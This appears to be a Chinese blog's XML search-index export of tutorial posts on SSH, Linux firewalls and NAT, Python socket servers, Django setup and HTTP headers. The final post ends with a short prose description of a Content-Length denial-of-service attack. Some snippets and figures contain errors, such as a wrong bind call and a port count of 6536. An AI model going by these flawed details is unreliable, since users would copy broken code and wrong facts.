选择相应的扫描插件然后填写 target 开始扫描了。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[远程连接服务器SSH]]></title>
      <url>%2F2016%2F09%2F01%2F%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0-%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5%E6%9C%8D%E5%8A%A1%E5%99%A8SSH%2F</url>
      <content type="text"><![CDATA[0x00 关于SSH如今最常用的文字界面连接到服务器的方式ssh，它比Telnet，rsh等更可靠，当然讲ssh更可靠，是因为通过ssh传输信息时，在网络上面的安全性更加可靠，因为是经过加密的，但是这并不代表ssh这个通讯协议就是安全的。 其实ssh协议本身提供两个功能，一个是类似telnet的远端连线使用shell的服务器，即是俗称的ssh；而另一个类似FTP服务的sftp-servet，以提供更安全的FTP服务。 ssh的加密技术ssh采用非对称秘钥加密机制，主要是通过两把不一样的公钥与私钥(Public and Private Key)来进行加密与解密的过程。 公钥:提供给远程主机进行资料加密的行为，所有人都可以取得你的公钥进行资料加密 私钥：本地端通过私钥进行解密，全世界只要本地客户机用于对应的私钥。 每个主机都应该拥有秘钥(公钥与私钥)，公钥用来加密私钥用来解密，私钥不可外泄，但是网络传输是双向的，所以，双方都应该要有对方的公钥。 0x01 启动sshssh是依赖于加密协议OpenSSL和软件OpenSSH的，但是对于Linux而言，这些都是预设好并且默认启动的。 也可以手动启动ssh: 12$ /etc/init.d/sshd restart$ netstat -tlnp | grep ssh]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[网络安全与主机基本防护]]></title>
      <url>%2F2016%2F08%2F31%2F%E7%AC%AC%E4%B8%83%E7%AB%A0-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%8E%E4%B8%BB%E6%9C%BA%E5%9F%BA%E6%9C%AC%E9%98%B2%E6%8A%A4%2F</url>
      <content type="text"><![CDATA[0x00 网络数据包进入主机的流程网络数据包流程概览Linux预设有两层防火墙，第一层是数据封包过滤式的netfilter防火墙，另一个是通过软件控制的TCP Wrappers是防火墙。 netfilter功能是由iptables这个软件提供的防火墙功能，只要是分析TCP/IP的数据包头来进行过滤，主要控制的是MAC,IP,ICMP,TCP与UDP的端口状态。而TCP_Wrappers是通过对/etc/hosts.allow与/etc/hosts.deny配置文件，针对TCP Header进行再次的分析。 0x01 限制端口连接我们知道端口共有6536个，在Linux中，只有root才能开启1024以内的端口。 端口观察端口的启动与服务有关，Linux中，端口与服务对应的关系存放在/etc/service文件里。此外，还可以使用以下两个命令来观察端口信息: netstat:用于观察本地的程序中的端口 nmap:可以探测其它网络中的主机的端口信息 关闭port number对应的服务正确的正常关闭一个服务的步骤是，找到目前系统上面正在运行的服务，并找到相对应的启动脚本(在/etc/init.d内)。 使用netstat -tunlp查找服务 0x02 SELinux管理原则]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[防火墙与NAT]]></title>
      <url>%2F2016%2F08%2F31%2F%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E9%98%B2%E7%81%AB%E5%A2%99%E4%B8%8ENAT%2F</url>
      <content type="text"><![CDATA[0x00 防火墙初识防火墙三大守护原则： 划分出被信任与不被信任的网络 切割出可以提供Internet的服务与必须受保护的服务 分析出可以接受与不可接受的数据包状态 0x01 TCP Wrappers对TCP Wrappers的设定是针对etc/hosts.{allow|deny}来设置的： 首先以/etc/hosts.allow为优先比较对象，符合该规则就放行 再以/etc/hosts.deny对比，符合规则就屏蔽掉 若是以上两条都不符合，择默认为通过 123$ vim /etc/hosts.allowALL: 127.0.0.1 #代表接受本机的去不服务 0x02 iptablesiptables利用封包过滤机制来分析数据包头，将分析结果与之前定义的规则进行对比，以次判断该数据包是否可以进入主机或者被丢弃。 注意防火墙的比对规则是有顺序的，并且该顺序不可逆。 Linux中的iptables默认有三个表格filter,nat,mangel: filterfilter（过滤器）主要与进入Linux本机的数据包有关 INPUT:主要与进入本机Linux的数据包有关 OUTPUT:主要与Linux本机发送的数据包有关 nat(地址转换)nat是Network Address Translation的缩写，主要用于网络路由转发有关。 PREROUTING:在进行路由判断之前所进行的规则 POSTROUTING:在进行路由判断之后要进行的规则。 OUTPUT:与发送出去的数据包有关 mangel(破坏者)这个少用。 0x03 防火墙简单实例 0x04 NAT服务器设定NAT(Network Address Translations)服务器的两个主要作用，一个是修改来源IP，一个是修改目标IP，于此对应的是来源NAT(Source NAT)与目标NAT(Destination NAT)。 SNAT主要用来处理内部LAN连接到internet的使用方式，而DNAT则是主要用在内部主机想要架设可以让internet访问的服务器。 NAT服务器与路由器的区别: 通常，NAT服务器一定是路由器，但是NAT服务器会修改IP包头的资料，所以与单纯转发封包的路由器不同。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Python网络(1)-socket简单编程]]></title>
      <url>%2F2016%2F08%2F17%2FPython%E7%BD%91%E7%BB%9C(1)-socket%E7%AE%80%E5%8D%95%E7%BC%96%E7%A8%8B%2F</url>
      <content type="text"><![CDATA[0x00 前言socke是进程间通信的一种方法，它是基于网络传输协议的上层接口，两个建立socket通信的进程可以分别属于两台不懂计算机。 双向管道(duplex PIPE)存活于同一台计算机,因此部分区分两台计算的地址，但是socket必须包含地址信息，以便实现网路通信。 一个socket包含四个地址信息:两台计算机的IP地址和两个进程所使用的端口(port)号。IP地址用于定位计算机，而port用于定位进程。 0x01 相关函数与模块#### 0x02 编程实现sock TCP连接socket有很多类型，比如基于TCP协议和UDO协议。其中又以TCP socket最常见。 TCP 是一种面向连接的传输层协议，TCP Socket 是基于一种 Client-Server 的编程模型，服务端监听客户端的连接请求，一旦建立连接即可以进行传输数据。那么对 TCP Socket 编程的介绍也分为客户端和服务端： 客户端123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354# !/usr/bin/python# coding:utf-8import socketimport sys# 创建sokcet实例try: # 如果创建失败，抛出socke.error异常 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)except socket.error, msg: print &apos;Failed to create socket.Error code:&apos; + str(msg[0]) + &apos;, Error message&apos; + msg[1] sys.exit()print &apos;socket created&apos;# 连接服务器# 获得要连接的主机ip地址HOST = &apos;www.google.com&apos;PORT = 80try: remote_ip = socket.gethostbyname(HOST)except socket.gaierror: # 如果不能解析，抛出异常 print &quot;host name could not be resolved. Exiting&quot; sys.exit()print &apos;ip address of &apos; + HOST + &apos; is &apos; + remote_ip# 连接到服务器特定端口上s.connect((remote_ip, PORT))print &apos;Socket Connected to &apos; + HOST + &apos; on ip &apos; + remote_ip# 发送数据message = &apos;GET /HTTP/1.1 \r\n\r\n&apos;try: s.sendall(message)except socket.error: print &apos;send failed&apos; sys.exit()print &apos;message send successfully&apos;# 数据发送完毕以后，客户端还得接受服务器的响应reply = s.recv(4096)print reply# 最后关闭socket连接s.close() 从上我们知道了:1.创建 socket2.连接到远程服务器3.发送数据4.接收数据5.关闭 socket 当我们打开 www.google.com 时，浏览器所做的就是这些，知道这些是非常有意义的。在 socket 中具有这种行为特征的被称为CLIENT，客户端主要是连接远程系统获取数据。socket 中另一种行为称为SERVER，服务器使用 socket 来接收连接以及提供数据，和客户端正好相反。所以 www.google.com 是服务器，你的浏览器是客户端，或者更准确地说，www.google.com 是 HTTP 服务器，你的浏览器是 HTTP 客户端。那么上面介绍了客户端的编程，现在轮到服务器端如果使用 socket 了。 服务器端服务器端主要做以下工作：1.打开 socket2.绑定到特定的地址以及端口上3.监听连接4.建立连接5.接收/发送数据 上面已经介绍了如何创建 socket 了，下面一步是绑定。 12345678910111213141516171819202122232425262728293031323334353637# !/usr/bin/python# coding:utf-8import socketimport sysHOST = &apos;&apos;# 意味着socket连接面向所有可以用的接口PORT = 8888# 创建一个socket实例s = socket.socket(socket.AF_INET, socket.SOCKET_STREAM)print &apos;socket created&apos;# 开始绑定socket# 函数 bind 可以用来将 socket 绑定到特定的地址和端口上，# 它需要一个 sockaddr_in 结构作为参数：try: s.bind(HOST, PORT)except socket.error, msg: print &apos;Bind failed. Error code:&apos; + str(msg[0]) + &apos;message&apos; + msg[1] sys.exit()print &apos;socket bind successfully&apos;# 开始监听# 该函数带有一个参数称为 backlog，用来控制连接的个数。s.listen(10)print &apos;socket now listening&apos;# 接收连接conn, addr = s.accept()# display client informationprint &apos;connected with&apos; + addr[0] + &apos;:&apos; + str(addr[1]) 此时，该程序在 8888 端口上等待请求的到来。不要关掉这个程序，让它一直运行，现在客户端可以通过该端口连接到 socket。 下面要做的是，服务器建立连接之后，接收客户端发送来的数据，并立即将数据发送回去，下面是完整的服务端程序： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647# !/usr/bin/python# coding:utf-8import socketimport sysHOST = &apos;&apos;# 意味着socket连接面向所有可以用的接口PORT = 8888# 创建一个socket实例s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)print &apos;socket created&apos;# 开始绑定socket# 函数 bind 可以用来将 socket 绑定到特定的地址和端口上，# 它需要一个 sockaddr_in 结构作为参数：try: s.bind((HOST, PORT))except socket.error, msg: print &apos;Bind failed. Error code:&apos; + str(msg[0]) + &apos;message&apos; + msg[1] sys.exit()print &apos;socket bind successfully&apos;# 开始监听# 该函数带有一个参数称为 backlog，用来控制连接的个数。s.listen(10)print &apos;socket now listening&apos;# 等待接收连接conn, addr = s.accept()# display client informationprint &apos;connected with&apos; + addr[0] + &apos;:&apos; + str(addr[1])# 现在，连接与客户端的会话# 接收来自客户端的数据data = conn.recv(1024)# 将数据原封不动的返回给客户端conn.sendall(data)# 关闭与客户端的数据连接conn.close()# 关闭sockets.close() 在一个终端中运行这个程序，打开另一个终端，使用 telnet 连接服务器，随便输入字符串，你会看到： 12345678 root  ~  PycharmProjects  First  1  telnet localhost 8888  1 Trying ::1...Trying 127.0.0.1...Connected to localhost.Escape character is &apos;^]&apos;.hello world!hello world!Connection closed by foreign host. 客户端（telnet）接收了服务器的响应，单是在完成一次响应之后服务器立即断开了连接，而像 www.google.com 这样的服务器总是一直等待接收连接的。我们需要将上面的服务器程序改造成一直运行，最简单的办法是将 accept 放到一个循环中，那么就可以一直接收连接了。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051# !/usr/bin/python# coding:utf-8import socketimport sysHOST = &apos;&apos;# 意味着socket连接面向所有可以用的接口PORT = 8888# 创建一个socket实例s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)print &apos;socket created&apos;# 开始绑定socket# 函数 bind 可以用来将 socket 绑定到特定的地址和端口上，# 它需要一个 sockaddr_in 结构作为参数：try: s.bind((HOST, PORT))except socket.error, msg: print &apos;Bind failed. Error code:&apos; + str(msg[0]) + &apos;message&apos; + msg[1] sys.exit()print &apos;socket bind successfully&apos;# 开始监听# 该函数带有一个参数称为 backlog，用来控制连接的个数。s.listen(10)print &apos;socket now listening&apos;# 等待接收连接while 1: conn, addr = s.accept() # display client information print &apos;connected with&apos; + addr[0] + &apos;:&apos; + str(addr[1]) # 现在，连接与客户端的会话 # 接收来自客户端的数据 data = conn.recv(1024) reply = &apos;ok...&apos; + data if not data: break conn.sendall(data) # 关闭与客户端的数据连接 conn.close()# 关闭sockets.close() 现在开启三个终端，分别telnet服务器，会发现，如果一个终端连接之后不输入数据其他终端是没办法进行连接的，而且每个终端只能服务一次就断开连接。 但是，实际上确实需要多个客户端可以随时建立连接，而且每个客户端可以跟服务器进行多次通信，这该怎么修改呢？ 处理连接为了处理每个连接，我们需要将处理的程序与主程序的接收连接分开。一种方法可以使用线程来实现，主服务程序接收连接，创建一个线程来处理该连接的通信，然后服务器回到接收其他连接的逻辑上来。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455# !/usr/bin/python# coding:utf-8import socketimport sysfrom thread import *HOST = &apos;&apos;PORT = 8888s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)print &apos;socket created&apos;# 绑定本地主机和端口号try: s.bind((HOST, PORT))except socket.error, msg: print &apos;bind failed. Error code:&apos; + str(msg[0]) + &apos;message:&apos; + msg[1] sys.exit()print &apos;socket bind complete&apos;# 开始监听s.listen(10)print &apos;Socket now listening&apos;# 函数用于处理数据，该函数将会用于创建线程def clientThread(conn): # 发送消息给连接到服务器的客户端 conn.send(&apos;welcome to server.&apos;) # 定义一个循环体，保证函数和线程的持续运行 while 1: # 接收客户端的数据 data = conn.recv(1024) rely = &apos;ok ...&apos; + data if not data: break conn.sendall(rely) # 退出循环时，关闭连接 conn.close()# 保持与客户端的连接while True: # 等待接收连接 conn, addr = s.accept() print &apos;Connected with &apos; + addr[0] + &apos;:&apos; + str(addr[1]) # 开始一个新的的线程，start_new_thread的第一参数是要运行的函数名 # 第二个参数时该函数所需要的参数列表 start_new_thread(clientThread, (conn, ))# 最后关闭sockets.close() 本文参考链接: http://www.cnblogs.com/hazir/p/python_socket_programming.html]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Python网络(3)-WSGI]]></title>
      <url>%2F2016%2F08%2F17%2FPython%E7%BD%91%E7%BB%9C(3)-WSGI%2F</url>
      <content type="text"><![CDATA[0x00 前言Python有着许多的 Web 框架，而同时又有着许多的 Web 服务器（Apache, Nginx, Gunicorn等）。那么，怎样确保可以在不修改Web服务器代码或网络框架代码的前提下，使用自己选择的服务器，并且匹配多个不同的网络框架呢？答案是接口，设计一套双方都遵守的接口就可以了。对python来说，就是WSGI（Web Server Gateway Interface，Web服务器网关接口）。其他编程语言也拥有类似的接口：例如Java的Servlet API和Ruby的Rack。 简单来说，WSGI是连接Web服务器和Web应用程序的桥梁，一方面从Web server 拿到原始 HTTP 数据，处理成统一格式后交给 Web 应用程序，另一方面从应用程序／框架这边进行业务逻辑处理，生成响应内容后交给服务器。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Django博客(2)Models]]></title>
      <url>%2F2016%2F08%2F15%2FDjango%E5%8D%9A%E5%AE%A2(2)Models%2F</url>
      <content type="text"><![CDATA[0x01 数据库设置我们将会通过Django设置数据库，创建第一个模型。 Django默认连接的是SQLite数据库，但是本文将以mysql数据库为例。 首先，打开mysql，并创建一个新的database:myblog： 12345 root  ~  mysql -uroot -p  1 Enter password: Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.mysql&gt; CREATE DATABASE villa DEFAULT CHARSET=utf8; 在mysql中创建一个onejustone账户，并赋予其相关权限: 12mysql&gt; GRANT SELECT, INSERT,UPDATE, DELETE, CREATE, DROP, INDEX, ALTER, CREATE TEMPORARY TABLES, LOCK TABLES ON myblog.* TO &apos;onejustone&apos;@&apos;localhost&apos; IDENTIFIED BY &apos;456&apos;;Query OK, 0 rows affected (0.00 sec) 然后在Django网站目录my_blog/my_blog/setting.py中进行数据连接配置: 123456789101112131415# Database# https://docs.djangoproject.com/en/1.10/ref/settings/#databasesDATABASES = &#123; &apos;default&apos;: &#123; #&apos;ENGINE&apos;: &apos;django.db.backends.sqlite3&apos;, #&apos;NAME&apos;: os.path.join(BASE_DIR, &apos;db.sqlite3&apos;), &apos;ENGINE&apos;: &apos;django.db.backends.mysql&apos;, &apos;NAME&apos;: &apos;myblog&apos;, &apos;USER&apos;: &apos;onejustone&apos;, &apos;PASSWORD&apos;: &apos;456&apos;, &apos;HOST&apos;: &apos;localhost&apos;, &apos;PORT&apos;: &apos;3306&apos;, &#125;&#125; 其中，ENGING代表相应数据库驱动，比如：django.db.backends.sqlite3, django.db.backends.postgresql,django.db.backends.mysql, or django.db.backends.oracle. NAME代表对应数据库的数据库名称。 如果使用默认的SQLite数据库，那么数据库将会时电脑硬盘中的一个文件，NAME所对应的应该该文件的绝对路径。比如os.path.join(BASE_DIR, &#39;db.sqlite3&#39;)。 OK，数据库基本配置已经完成，开始创建model,确切的讲，就是为数据库布局和添加一些额外的数据。因为在Django的帮助下，我们不用直接编写SQL语句。Django将关系型的表(table)转换成为一个类(class)。而每个记录(record)是该类下的一个对象(object)。我们可以使用基于对象的方法，来操纵关系型的MySQL数据库。 我们在my_blog/my_blog/models.py中来创建数据库模型: 1234567891011121314151617from __future__ import unicode_literalsfrom django.db import models# Create your models here.class Article(models.Model) : title = models.CharField(max_length = 100) #博客题目 category = models.CharField(max_length = 50, blank = True) #博客标签 date_time = models.DateTimeField(auto_now_add = True) #博客日期 content = models.TextField(blank = True, null = True) #博客文章正文 #python2使用__unicode__, python3使用__str__ def __str__(self) : return self.title class Meta: #按时间下降排序 ordering = [&apos;-date_time&apos;] 每个模型(表)是一个类，每个类都是django.db.models.Mode的子类，类中定义的每个变量都代表了数据库中一个字段。 其中str(self) 函数Article对象要怎么表示自己. 接下来便是需要在mysite/settings.py中添加app实例了: 1234567891011# Application definitionINSTALLED_APPS = [ &apos;django.contrib.admin&apos;, &apos;django.contrib.auth&apos;, &apos;django.contrib.contenttypes&apos;, &apos;django.contrib.sessions&apos;, &apos;django.contrib.messages&apos;, &apos;django.contrib.staticfiles&apos;, &apos;article&apos;,] 现在Django知道有 article 这个aap了，进一步运行 python manage.py makemigration pools以告诉Djano我们对models进行了一些修改，并且希望它可以看到如下内容: 12345Migrations for &apos;polls&apos;: polls/migrations/0001_initial.py: - Create model Choice - Create model Question - Add field question to choice 生成数据库脚本下面，可以开始数据库迁移前的准备工作， 运行sqlmigrate命令，并结合对应模型名称，Django会自动生成对应模块的数据库脚本文件。 12$ python manage.py sqlmigrate polls 0001BEGIN;---- Create model Choice--CREATE TABLE &quot;polls_choice&quot; ( &quot;id&quot; serial NOT NULL PRIMARY KEY, &quot;choice_text&quot; varchar(200) NOT NULL, &quot;votes&quot; integer NOT NULL); 下一步使用migtrate命令进行数据库迁移: 12$ python manage.py migrateOperations to perform: Apply all migrations: admin, auth, contenttypes, polls, sessionsRunning migrations: Rendering model states... DONE Applying polls.0001_initial... OK 总结:Python创建数据库模型的三个步骤:1.在models.py中更改数据模式2.运行python manage.py makemigrations为更改创建迁移3.运行python manage.py migrate将这些更改应用到数据库中]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Django(1)-MyFirstView]]></title>
      <url>%2F2016%2F08%2F15%2FDjango(1)-MyFirstView%2F</url>
      <content type="text"><![CDATA[0x00 安装并创建第一个Django Project启动计算机中的Python，尝试载入Django模块。如果可以成功载入，那么说明Django已经安装好： 12import djangoprint (django.VERSION) 这里的Django版本为1.10. 否则安装Django 123pip install django或者easy_install django Django安装完成，使用django-admin startproject 命令创建一个网站根目录: 1root ~ PycharmProjects 2 django-admin startproject mysite 使用tree命令查看其目录结构: 12345678910 root ~ PycharmProjects mysite 2 tree.├── manage.py└── mysite ├── __init__.py ├── settings.py ├── urls.py └── wsgi.py1 directory, 5 files 我们会发现执行命令后，新建了一个 mysite 目录，其中还有一个 mysite 目录，这个子目录 mysite 中是一些项目的设置 settings.py 文件，总的urls配置文件 urls.py 以及部署服务器时用到的 wsgi.py 文件， init.py python包的目录结构必须的，与调用有关。 进入mysite目录,启动服务器 python mamage.py runserver 然后在浏览器中访问:localhsot:8000 12345678 root ~ PycharmProjects mysite 2 python manage.py runserver Performing system checks...System check identified no issues (0 silenced).August 15, 2016 - 03:15:32Django version 1.10, using settings &apos;mysite.settings&apos;Starting development server at http://127.0.0.1:8000/Quit the server with CONTROL-C. OK，这样便创建好了一个Django工程，下面在这个工程下添加第一个app。 0x01 创建第一个app使用python mamage.py startapp来创建一个appapp和project关系是，一个project可以包含多个app，一个app可以被多个project共享。 12345678910111213root ~ PycharmProjects mysite 2 python manage.py startapp polls root ~ PycharmProjects mysite 2 tree polls polls├── admin.py├── apps.py├── __init__.py├── migrations│ └── __init__.py├── models.py├── tests.py└── views.py1 directory, 7 files app创建完成以后还需要在mysite/setting.py中添加app的实例: 123456789101112 root  ~  PycharmProjects  mysite  cat mysite/settings.py# Application definitionINSTALLED_APPS = [ &apos;django.contrib.admin&apos;, &apos;django.contrib.auth&apos;, &apos;django.contrib.contenttypes&apos;, &apos;django.contrib.sessions&apos;, &apos;django.contrib.messages&apos;, &apos;django.contrib.staticfiles&apos;, &apos;polls&apos;,] 新建的 app 如果不加到 INSTALL_APPS 中的话, django 就不能自动找到app中的模板文件(app-name/templates/下的文件)和静态文件(app-name/static/中的文件) 。 第一个view打开polls/view.py 并添加如下code： 123456from django.shortcuts import renderfrom django.http import HttpResponse# Create your views here.def index(request): return HttpResponse(&quot;&lt;p&gt;Hello, world.You&apos;re at the pools index.&lt;/p&gt;&quot;) 声明编码为utf-8, 若是在代码中用到了中文,如果不声明就报错. view的code写好了，那么便是需要为它创建URL映射了，当通过浏览器访问时才能得到polls.index页面的响应。 因此，还需要在polls目录下创建一个urls.py文件，添加完成以后的polls目录树如下: 12345678910111213 root ~ PycharmProjects mysite polls 2 tree.├── admin.py├── apps.py├── __init__.py├── migrations│ └── __init__.py├── models.py├── tests.py├── urls.py└── views.py1 directory, 8 files 然后在polls/urls.py中添加如下code: 12345678from django.conf.urls import urlfrom polls import views as polls_views#首先引用polls模块，作为视图并设置别名polls_viewsurlpatterns = [ url(r&apos;^$&apos;, polls_views.index, name=&apos;index&apos;),] 接下来，需要使根目录下的URLconf指向polls.urls模块,那么需要在mysite/urls文件中引入import for django.conf.urls.include，并且在urlpatterns列表中插入include()方法。 1234567 root ~ PycharmProjects mysite mysite 2 vim urls.pyfrom django.conf.urls import url, includefrom django.contrib import adminurlpatterns = [ url(r&apos;^admin/&apos;, admin.site.urls), url(r&apos;^polls/&apos;, include(&apos;polls.urls&apos;)),] 最后，启动服务器: 1root ~ PycharmProjects mysite 2 python manage.py runserver 使用浏览器访问http://127.0.0.1:8000/polls/，可以看到:Hello, world.You’re at the pools index. OK,到此，我们的第一Python app的第一view就创建成功， 接下来，该看看数据库了。 本文参考:django官方文档 https://media.readthedocs.org/pdf/django/1.10.x/django.pd]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Python网络(2)-Python服务器进阶]]></title>
      <url>%2F2016%2F08%2F14%2FPython%E7%BD%91%E7%BB%9C(2)-Python%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%9B%E9%98%B6%2F</url>
      <content type="text"></content>
    </entry>

    
    <entry>
      <title><![CDATA[HTTP 请求/响应]]></title>
      <url>%2F2016%2F08%2F14%2FHTTP-%E8%AF%B7%E6%B1%82and%E5%93%8D%E5%BA%94%2F</url>
      <content type="text"><![CDATA[0x00 前言 http（超文本传输协议）是一个基于请求与响应模式的、无状态的、应用层的协议，常基于TCP的连接方式。无状态是指协议对于事务处理没有记忆能力。缺少状态意味着如果后续处理需要前面的信息，则它必须重传，这样可能导致每次连接传送的数据量增大。 0x01 HTTP协议之请求 http请求由三部分组成，分别是：请求行、消息报头、请求正文。 请求行以一个方法符号开头，以空格分开，后面跟着请求的URI和协议的版本，格式如下：Method Request-URI HTTP-Version CRLF 其中 Method表示请求方法；Request-URI是一个统一资源标识符；HTTP-Version表示请求的HTTP协议版本；CRLF表示回车和换行。 常用方法有:GET 请求获取Request-URI所标识的资源POST 在Request-URI所标识的资源后附加新的数据HEAD 请求获取由Request-URI所标识的资源的响应消息报头 GET是请求服务器发送资源给客户，POST是请求服务器接收客户送来的数据。当我们打开一个网页时，我们通常是使用GET方法；当我们填写表格并提交时，我们通常使用POST方法。 比如:12GET /test.jpg HTTP/1.xAccept: text/* 0x02 HTTP协议之响应HTTP响应也是由三个部分组成，分别是：状态行、消息报头、响应正文。 1、状态行格式如下：HTTP-Version Status-Code Reason-Phrase CRLF其中，HTTP-Version表示服务器HTTP协议的版本；Status-Code表示服务器发回的响应状态代码；Reason-Phrase表示状态代码的文本描述。 状态代码有三位数字组成，第一个数字定义了响应的类别，且有五种可能取值：1xx：指示信息–表示请求已接收，继续处理2xx：成功–表示请求已被成功接收、理解、接受3xx：重定向–要完成请求必须进行更进一步的操作4xx：客户端错误–请求有语法错误或请求无法实现5xx：服务器端错误–服务器未能实现合法的请求常见状态代码、状态描述、说明：200 OK //客户端请求成功400 Bad Request //客户端请求有语法错误，不能被服务器所理解401 Unauthorized //请求未经授权，这个状态代码必须和WWW-Authenticate报头域一起使用403 Forbidden //服务器收到请求，但是拒绝提供服务404 Not Found //请求资源不存在，eg：输入了错误的URL500 Internal Server Error //服务器发生不可预期的错误503 Server Unavailable //服务器当前不能处理客户端的请求，一段时间后可能恢复正常 HTTP消息由客户端到服务器的请求和服务器到客户端的响应组成。请求消息和响应消息都是由开始行（对于请求消息，开始行就是请求行，对于响应消息，开始行就是状态行），消息报头（可选），空行（只有CRLF的行），消息正文（可选）组成。 比如: 12HTTP/1.x 200 OK Content-Type: text/html 0x03 HTTP协议之报头HTTP消息由客户端到服务器的请求和服务器到客户端的响应组成。请求消息和响应消息都是由开始行（对于请求消息，开始行就是请求行，对于响应消息，开始行就是状态行），消息报头（可选），空行（只有CRLF的行），消息正文（可选）组成。 HTTP消息报头包括普通报头、请求报头、响应报头、实体报头。每一个报头域都是由名字+“：”+空格+值 组成，消息报头域的名字是大小写无关的。 比如: 1Content-Type: image/jpg 普通报头Cache-Control 用于指定缓存指令，缓存指令是单向的（响应中出现的缓存指令在请求中未必会出现），且是独立的（一个消息的缓存指令不会影响另一个消息处理的缓存机制），HTTP1.0使用的类似的报头域为Pragma。请求时的缓存指令包括：no-cache（用于指示请求或响应消息不能缓存）、no-store、max-age、max-stale、min-fresh、only-if-cached;响应时的缓存指令包括：public、private、no-cache、no-store、no-transform、must-revalidate、proxy-revalidate、max-age、s-maxage.eg：为了指示IE浏览器（客户端）不要缓存页面，服务器端的JSP程序可以编写如下： 123response.sehHeader(&quot;Cache-Control&quot;,&quot;no-cache&quot;);//response.setHeader(&quot;Pragma&quot;,&quot;no-cache&quot;);//作用相当于上述代码，通常两者//合用这句代码将在发送的响应 消息中设置普通报头域：Cache-Control:no-cache。 Date普通报头域表示消息产生的日期和时间。 Connection普通报头域允许发送指定连接的选项。例如指定连接是连续，或者指定“close”选项，通知服务器，在响应完成后，关闭连接。 请求报头请求报头允许客户端向服务器端传递请求的附加信息以及客户端自身的信息。 User-Agent：User-Agent请求报头域允许客户端将它的操作系统、浏览器和其它属性告诉服务器。不过，这个报头域不是必需的，如果我们自己编写一个浏览器，不使用User-Agent请求报头域，那么服务器端就无法得知我们的信息了。 AcceptAccept请求报头域用于指定客户端接受哪些类型的信息。 12Accept： image/gif，表明客户端希望接受GIF图象格式的资源；Accept： text/html，表明客户端希望接受html文本。 Accept-CharsetAccept-Charset请求报头域用于指定客户端接受的字符集。 12Accept-Charset: iso-8859-1,gb2312如果在请求消息中没有设置这个域，缺省是任何字符集都可以接受。 Accept-EncodingAccept-Encoding请求报头域类似于Accept，但是它是用于指定可接受的内容编码。 12Accept-Encoding: gzip.deflate.如果请求消息中没有设置这个域服务器假定客户端对各种内容编码都可以接受。 Accept-LanguageAccept-Language请求报头域类似于Accept，但是它是用于指定一种自然语言。 12Accept-Language: zh-cn.如果请求消息中没有设置这个报头域，服务器假定客户端对各种语言都可以接受。 AuthorizationAuthorization请求报头域主要用于证明客户端有权查看某个资源。当浏览器访问一个页面时，如果收到服务器的响应代码为401（未授权），可以发送一个包含Authorization请求报头域的请求，要求服务器对其进行验证。 Host（发送请求时，该报头域是必需的）Host请求报头域主要用于指定被请求资源的Internet主机和端口号，它通常从HTTP URL中提取出来的。 响应报头响应报头允许服务器传递不能放在状态行中的附加响应信息，以及关于服务器的信息和对Request-URI所标识的资源进行下一步访问的信息。 LocationLocation响应报头域用于重定向接受者到一个新的位置。Location响应报头域常用在更换域名的时候。 ServerServer响应报头域包含了服务器用来处理请求的软件信息。与User-Agent请求报头域是相对应的。下面是Server响应报头域的一个例子： 1Server：Apache-Coyote/1.1 WWW-AuthenticateWWW-Authenticate响应报头域必须被包含在401（未授权的）响应消息中，客户端收到401响应消息时候，并发送Authorization报头域请求服务器对其进行验证时，服务端响应报头就包含该报头域。 1WWW-Authenticate:Basic realm=&quot;Basic Auth Test!&quot; //可以看出服务器对请求资源采用的是基本验证机制。 实体报头请求和响应消息都可以传送一个实体。一个实体由实体报头域和实体正文组成，但并不是说实体报头域和实体正文要在一起发送，可以只发送实体报头域。 Content-EncodingContent-Encoding实体报头域被用作媒体类型的修饰符，它的值指示了已经被应用到实体正文的附加内容的编码，因而要获得Content-Type报头域中所引用的媒体类型，必须采用相应的解码机制。 Content-Encoding这样用于记录文档的压缩方法： 1content-Encoding：gzip Content-LanguageContent-Language实体报头域描述了资源所用的自然语言。没有设置该域则认为实体内容将提供给所有的语言阅读者。 1Content-Language:da Content-LengthContent-Length实体报头域用于指明实体正文的长度，以字节方式存储的十进制数字来表示。 Content-TypeContent-Type实体报头域用语指明发送给接收者的实体正文的媒体类型。 123Content-Type: text/html;charset=ISO-8859-1Content-Type: text/html;charset=GB2312LContent-Type: text/image Last-ModifiedLast-Modified实体报头域用于指示资源的最后修改日期和时间。 ExpiresExpires实体报头域给出响应过期的日期和时间。为了让代理服务器或浏览器在一段时间以后更新缓存中(再次访问曾访问过的页面时，直接从缓存中加载，缩短响应时间和降低服务器负载)的页面，我们可以使用Expires实体报头域指定页面过期的时间。 1Expires：Thu，15 Sep 2006 16:23:12 GMT HTTP1.1的客户端和缓存必须将其他非法的日期格式（包括0）看作已经过期。 为了让浏览器不要缓存页面，我们也可以利用Expires实体报头域，设置为0，jsp中程序: 1response.setDateHeader(&quot;Expires&quot;,&quot;0&quot;); 0x04 基于HTTP协议的攻击面HTTP协议Content Lenth限制漏洞导致拒绝服务攻击使用POST方法时，可以设置ContentLenth来定义需要传送的数据长度，例如ContentLenth:999999999，在传送完成前，内 存不会释放，攻击者可以利用这个缺陷，连续向WEB服务器发送垃圾数据直至WEB服务器内存耗尽。这种攻击方法基本不会留下痕迹。 